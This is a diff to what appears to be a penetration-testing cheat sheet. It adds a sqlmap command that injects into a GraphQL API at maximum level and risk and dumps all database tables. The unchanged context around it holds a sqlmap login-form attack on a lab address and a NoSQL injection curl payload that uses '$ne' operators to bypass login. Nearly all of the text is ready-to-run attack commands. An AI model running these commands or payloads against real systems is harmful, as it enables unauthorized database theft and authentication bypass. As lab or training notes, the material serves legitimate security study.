@@ -366,6 +366,17 @@ Port forwarding to access a local postgres server:
 # sqlmap -u http://10.10.10.151/user/login.php --data 'username=test&password=test&submit
 ```
 
+```
+# sqlmap -u 'http://url/api' \
+   --headers 'Content-Type: application/json' \
+   --data '{"query":"{ xxx(id: \"*\"){ yyy, zzz} }"}' \ # Specify the entrypoint with *
+   --level=5 --risk=3 \ # Max aggressivity
+   --dbms "MySQL" \ 
+   --technique="UB" \ # Specify the type of attack (here union/boolean)
+   -D a_db -T a_table -a \ # Database & db to target
+   --all # retrieve all the tables
+```
+
  - NoSQLi
 
     curl http://site/ --data "username[$ne]=toto&password[$ne]=toto&Submit=Sign+in"
